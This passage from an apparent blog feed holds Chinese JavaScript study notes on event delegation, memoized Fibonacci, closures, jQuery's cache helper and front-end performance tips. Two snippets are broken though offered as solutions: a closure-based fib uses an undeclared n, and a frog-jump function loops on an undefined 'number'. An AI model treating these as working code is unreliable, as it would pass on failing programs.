class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">'ul'</span>);</span><br><span class="line">ul.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; <span class="comment">// 事件委托</span></span><br><span class="line">    <span class="keyword">var</span> e = e.target;</span><br><span class="line">    <span class="keyword">while</span> (e.nodeName != <span class="string">'LI'</span>) &#123;</span><br><span class="line">        e = e.parentNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> childrenArr = [].slice.apply(ul.children);<span class="comment">// 伪数组转为数组 为了使用filter方法</span></span><br><span class="line">    <span class="keyword">var</span> liArr = childrenArr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">child</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (child.nodeName == <span class="string">'LI'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> child;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(liArr.indexOf(e));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="输出字符串中所有的叠词"><a href="#输出字符串中所有的叠词" class="headerlink" title="输出字符串中所有的叠词"></a>输出字符串中所有的叠词</h2><p>输入： ‘晴川历历汉阳树，芳草萋萋鹦鹉洲’<br>输出： [ ‘历历’, ‘萋萋’ ]<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rw</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i] == str[i<span class="number">-1</span>]) &#123;</span><br><span class="line">            result.push(str.slice(i<span class="number">-1</span>,i+<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实现一个add函数"><a href="#实现一个add函数" class="headerlink" title="实现一个add函数"></a>实现一个add函数</h2><p>执行如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> arr = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arr = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;数组扁平化&quot;&gt;&lt;a href=&quot;#数组扁平化&quot; class=&quot;headerlink&quot; title=&quot;数组扁平化&quot;&gt;&lt;/a&gt;数组扁平化&lt;/h2&gt;&lt;p&gt;例：&lt;br&gt;输入：[[1, 2, 2], [3, 4, 5, 5], [6, 7, 8, 9, [11, 12, [
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于斐波那契数列的一些思考</title>
    <link href="http://yoursite.com/2017/09/27/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://yoursite.com/2017/09/27/斐波那契数列的一些思考/</id>
    <published>2017-09-27T14:46:32.000Z</published>
    <updated>2017-09-27T14:46:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>先看代码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n===<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n===<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fib(<span class="number">11</span>));</span><br></pre></td></tr></table></figure></p><p>这是一个很典型的利用递归计算斐波那契数列</p><p>递归的缺点也是显而易见的,我们计算fib(6)时 要计算fib(5)和fib(4)</p><p>而后计算fib(7)时,又要重复计算fib(6)与fib(5)</p><p>很明显,我们之前已经计算过了fib(6)与fib(5),现在重复计算,造成了浪费。</p><p>首先我们来观察一下 当n从20到21时,调用此函数 内部会多调用多少次此函数?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count=<span class="number">0</span>;<span class="comment">//计数器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">if</span>(n===<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n===<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fib(<span class="number">20</span>));</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//13529次</span></span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(fib(<span class="number">21</span>));</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//35420次  从20到21 调用次数增加很多</span></span><br></pre></td></tr></table></figure><p>其实我们完全可以将之前计算过的数值用一个数组保存起来，如果需要重复计算，先去数组内部查找，如果数组里面存在该结果，直接return</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cache = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> cache[n];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cache[n])&#123; <span class="comment">//如果缓存数组中存在 直接返回</span></span><br><span class="line">            <span class="keyword">return</span> cache[n];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> temp = fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>); <span class="comment">//如果缓存数组中不存在 进行递归</span></span><br><span class="line">            cache[n]=temp;   <span class="comment">//将递归结果存入缓存数组</span></span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">console</span>.log(fib(<span class="number">20</span>));</span><br></pre></td></tr></table></figure><p>这样已经能够节省很多递归造成的空间浪费。</p><p>但缓存数组孤零零的放在全局作用域，不够安全，封装性也不好。</p><p>我们希望他们联系的能够更紧密一些，就像一个整体。</p><p>于是有了下面的代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cache = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> cache[n];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cache[n])&#123; <span class="comment">//如果缓存数组中存在 直接返回</span></span><br><span class="line">                <span class="keyword">return</span> cache[n];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> temp = fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>); <span class="comment">//如果缓存数组中不存在 进行递归</span></span><br><span class="line">                cache[n]=temp;   <span class="comment">//将递归结果存入缓存数组</span></span><br><span class="line">                <span class="keyword">return</span> temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fib;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p><p>这样，我们通过闭包，只能通过返回的fib方法对cache进行操作了。</p><p>当然，你也可以像下面这样写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cache=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>];<span class="comment">//缓存数组被封装在闭包中,外界只能通过返回的方法进行操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">editCache</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="literal">undefined</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> cache[index];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cache[index]=value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> fibCache=createCache();<span class="comment">//创建缓存数组并且获取接口方法</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> fibCache(n);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(fibCache(n))&#123;</span><br><span class="line">            <span class="keyword">return</span> fibCache(n);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> temp = fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>);</span><br><span class="line">            fibCache(n,temp);</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>递归效率低是函数调用的开销导致的。<br>在一个函数调用之前需要做许多工作，比如准备函数内局部变量使用的空间、搞定函数的参数等等，这些事情每次调用函数都需要做，因此会产生额外开销导致递归效率偏低，<a href="https://www.zhihu.com/question/35255112/answer/62180021" target="_blank" rel="noopener">知乎</a><br>其实一般递归的方法我们都可以通过迭代的方式来做，for循环就是一个很好的选择：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> arr = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        arr[i] = arr[i<span class="number">-1</span>] + arr[i<span class="number">-2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来也挺好的，是吧。</p><p>下面进入算法时间，题目来自《剑指Offer》，当然，递归依然是主角。</p><p>题目一：<br>一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法？</p><p>解题：数学归纳法。<br>1级台阶，1种跳法，直接跳上1级台阶 f(1) = 1<br>2级台阶，2种跳法，直接跳上2级台阶或者连续跳两次，每次一级 f(2) = 2<br>3级台阶，3种跳法，如果第一次跳1级，剩下2级台阶，f(2) = 2种跳法;如果第一次跳2级，剩下1级台阶，f(1) = 1种跳法。f(3) = f(2) + f(1) = 2 + 1 = 3<br>4级台阶，5种跳法，如果第一次跳1级，剩下3级台阶，由上一条可知有3种跳法；如果第一次跳2级，剩下2级台阶，由上上条可知有2种跳法，f(4) = f(3) + f(2) = 3 + 2 = 5<br>规律很清楚了，斐波那契数列变一变就是的了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jump</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">0</span> &amp;&amp; n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> jump(n<span class="number">-1</span>) + jump(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目二：<br>一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级……它也可以跳上 n 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法？</p><p>解题：继续归纳。<br>1级台阶，1种跳法<br>2级台阶，2种跳法<br>3级台阶，4种跳法 f(3) = f(2) + f(1) + 1 = 4<br>4级台阶，第一次跳1级，后面有f(3)种跳法，第一次跳2级，后面有f(2)种跳法，第一次跳3级，后面有f(1)种跳法，第一次跳4级，没了。<br>总共f(4) = f(3) + f(2) + f(1) + 1 = 8种跳法<br>5级台阶，f(5) = f(4) + f(3) + f(2) + f(1) + 1 = 16种跳法<br>归纳得，f(n) = f(n-1) + f(n-2) + … + f(1) + 1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jump</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">0</span> &amp;&amp; n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(number &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            tmp+=jump(n<span class="number">-1</span>);</span><br><span class="line">            number--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看jQuery中的缓存机制:</p><p>自己实现如下:</p><pre><code>function createCache(){//不使用自执行函数创建块级作用域的原因是:    //我们要多次创建这里面的内容(有多个缓存),而不是像原来一样仅仅创建一次    var cache={}; //创建缓存对象    var index=[];//存放键名的数组,用于缓存过多时进行清理(因为缓存对象无法判断有多少个缓存在内)    return function editCache(key,value){        if(value===undefined){            return cache[key];//如果不传value就是查询        }else{            cache[key]=value;//如果传了value就是设置            index.push(key);            if(index.length&gt;=50){//当缓存的数量到达一个临界时(此处是50),删除最早的缓存                var tempKey = index.shift();//获取键名  并 删除 index中的该键                delete cache[tempKey];//删除cache内的属性            }        }    } }var eleCache=createCache();var typeCache=createCache();//多次创建,每一个Cache都有自己的一个空间var classCache=createCache();var eventCache=createCache();eleCache(&quot;name&quot;,&quot;zhaozhiwen&quot;);//storeelemCache(&quot;name&quot;)//get</code></pre><p>jQuery源码:</p><pre><code>function createCache() {    var keys = [];    function cache( key, value ) {        //这里直接将这个函数当作缓存对象,减少了创建对象的次数        //同时由于缓存属性都是直接加在这个对象上  且return出去了 可以直接通过cache[&apos;键名&apos;]获取缓存值 于是函数内部设置缓存即可        //分两个角度看:  当cache是对象是 他有缓存属性 用于查询        //当cache是方法时 他给自己(对象)设置添加缓存        //更简洁 jQuery的优美之处啊 巧夺天工        // 使用(key + &quot; &quot;) 是为了避免和原生（本地）的原型中的属性冲突        if ( keys.push( key + &quot; &quot; ) &gt; 3 ) {            // 只保留最新存入的数据            delete cache[ keys.shift() ];        }        // 1 给 cache 赋值        // 2 把值返回        return (cache[ key + &quot; &quot; ] = value);    }    return cache;}var typeCache = createCache(); //创建缓存对象并获取接口方法/*typeCache(&quot;monitor&quot;,&quot;周娇娇&quot;);console.log(typeCache[&quot;monitor&quot;]);//这样是查不到的,因为存储的时候 加了&quot; &quot;*/typeCache(&quot;monitor1&quot;,&quot;张学友&quot;);  //向缓存中存入内容console.log(typeCache[&quot;monitor1 &quot;]); //通过键名取出内容typeCache(&quot;monitor2&quot;,&quot;刘德华&quot;);console.log(typeCache[&quot;monitor2 &quot;]);typeCache(&quot;monitor3&quot;,&quot;彭于晏&quot;);console.log(typeCache[&quot;monitor3 &quot;]);typeCache(&quot;monitor4&quot;,&quot;赵志文&quot;); //这次再进行缓存,超出了限制,第一个缓存被干掉了console.log(typeCache[&quot;monitor1 &quot;]); //undefined</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先看代码:&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端性能优化</title>
    <link href="http://yoursite.com/2017/09/24/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://yoursite.com/2017/09/24/前端性能优化/</id>
    <published>2017-09-24T11:22:36.000Z</published>
    <updated>2017-09-24T11:22:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/4869616-36154be394a65dfd.jpg?imageMogr2/auto-orient/strip" alt="性能优化思考维度.jpg"></p><blockquote><p>性能优化感觉大家都能说出几条来，粗略点无非是减少http请求、减轻请求数据大小等等，详细点就是css/js合并压缩、雪碧图等等，但实在是散乱无章，如何有条理地回答面试官的问题就很重要了，其实可以从不同的维度，不同方面去进行回答。<br>总结自：<br><a href="https://juejin.im/post/59c2109cf265da066875eff5" target="_blank" rel="noopener">鸟瞰前端 , 再论性能优化</a></p></blockquote><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="“从用户输入URl到页面展示给用户浏览器客户端的过程中发生了什么？”"><a href="#“从用户输入URl到页面展示给用户浏览器客户端的过程中发生了什么？”" class="headerlink" title="“从用户输入URl到页面展示给用户浏览器客户端的过程中发生了什么？”"></a>“从用户输入URl到页面展示给用户浏览器客户端的过程中发生了什么？”</h3><p><img src="http://upload-images.jianshu.io/upload_images/4869616-d4ecfc72af5e399c.jpg?imageMogr2/auto-orient/strip" alt="http.jpg"><br><a href="https://segmentfault.com/a/1190000006879700" target="_blank" rel="noopener">前端经典面试题: 从输入URL到页面加载发生了什么？</a> </p><h3 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h3><p><img src="http://upload-images.jianshu.io/upload_images/4869616-597251687b12933e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="页面展示过程.png"></p><ol><li>HTML被解析成DOM Tree，CSS被解析成CSS Rule Tree</li><li>把DOM Tree和CSS Rule Tree经过整合生成Render Tree（布局阶段）</li><li>元素按照算出来的规则，把元素放到它该出现的位置，通过显卡画到屏幕上</li></ol><p>CSS不会阻塞DOM Tree生成，会阻塞渲染，但JS会阻塞DOM 加载。</p><h3 id="重绘和回流"><a href="#重绘和回流" class="headerlink" title="重绘和回流"></a>重绘和回流</h3><p><a href="http://34585f3f.wiz03.com/share/s/0Qm5Y_0RRQtc2F-3Zy2piy1K0E4QKp0IAQvZ2PEFvB08u3fM" target="_blank" rel="noopener">如何写出高性能DOM？</a></p><h2 id="浏览器宿主环境"><a href="#浏览器宿主环境" class="headerlink" title="浏览器宿主环境"></a>浏览器宿主环境</h2><h3 id="1-突破单线程解析渲染阻塞限制"><a href="#1-突破单线程解析渲染阻塞限制" class="headerlink" title="1.  突破单线程解析渲染阻塞限制"></a>1.  突破单线程解析渲染阻塞限制</h3><p>浏览器是一个单线程解析模式去解析渲染从服务器端拿到的html文本，css加载（渲染）的过程中会对后续的脚本资源加载造成阻塞，脚本的加载也会阻塞后续DOM结构的解析造成页面的留白时间增长，雅虎的35条军规中有一条就是<strong>样式文件放在头部，脚本文件放在DOM节点最末尾</strong>，减少阻塞。这里还有几个针对脚本文件的优化：</p><ul><li>针对不需要DOM操作（主要考虑是需要操作DOM的脚本往往需要获取一些样式信息）的Js脚本可以采用动态创建script的方式载入，动态载入的脚本不阻塞后续资源的加载。</li><li>脚本文件加载可以加上defer或者async属性标识防止阻塞<br>defer是在HTML解析完之后才会执行，如果是多个，按照加载的顺序依次执行<br>async是在加载完成后立即执行，如果是多个，执行顺序和加载顺序无关</li></ul><h3 id="2-避开Cookie性能bug——静态资源CDN"><a href="#2-避开Cookie性能bug——静态资源CDN" class="headerlink" title="2. 避开Cookie性能bug——静态资源CDN"></a>2. 避开Cookie性能bug——静态资源CDN</h3><p>Cookie是前端作为前后台登录态校验最通常用的缓存方案，但鉴于浏览器在每次都会往同域的任何资源的http请求中自动带上cookie信息的情况，这里有必要进行优化一下，因为像css、js、image这些资源请求是不需要cookie信息的，会无端造成请求带宽的浪费（想象一下我们的cookie大小假设为10K，100个请求就是近1M的大小，高并发下以我们现行网络带宽也是蛮大的一笔负担了）。</p><p>Cookie free性能优化方案的处理方式是CDN异域静态资源服务器部署我们的前端css、js、image资源。</p><h3 id="3-代码优化——事件委托等"><a href="#3-代码优化——事件委托等" class="headerlink" title="3. 代码优化——事件委托等"></a>3. 代码优化——事件委托等</h3><p>其实这里有很多点：</p><ul><li>要插入DOM片段时最好使用fragment一次性插入；</li><li>动态生成100li如何绑定事件，可以通过事件冒泡利用事件委托给父元素绑定事件即可；</li><li>对于查找过的节点可以缓存下来，避免再次查找</li><li>…</li></ul><h2 id="DNS层"><a href="#DNS层" class="headerlink" title="DNS层"></a>DNS层</h2><h3 id="DNS预解析"><a href="#DNS预解析" class="headerlink" title="DNS预解析"></a>DNS预解析</h3><p><a href="http://skyhome.cn/div_css/301.html" target="_blank" rel="noopener">前端优化:DNS预解析提升页面速度</a><br>这里也是我第一次遇到link标签的另外用法。</p><h2 id="HTTP层"><a href="#HTTP层" class="headerlink" title="HTTP层"></a>HTTP层</h2><h3 id="1-减少HTTP请求数量"><a href="#1-减少HTTP请求数量" class="headerlink" title="1. 减少HTTP请求数量"></a>1. 减少HTTP请求数量</h3><ol><li>合并CSS、JS文件</li><li>CSS sprites雪碧图</li><li>font-icon字体图标</li><li>图片base64编码传输</li><li><a href="http://www.jianshu.com/p/4876a4fe7731" target="_blank" rel="noopener">图片懒加载</a></li><li><a href="http://blog.hackerwen.tech/2017/09/14/HTTP%E4%B9%8B%E7%BC%93%E5%AD%98/" target="_blank" rel="noopener">HTTP缓存机制</a>  <h3 id="2-减轻HTTP请求数据大小"><a href="#2-减轻HTTP请求数据大小" 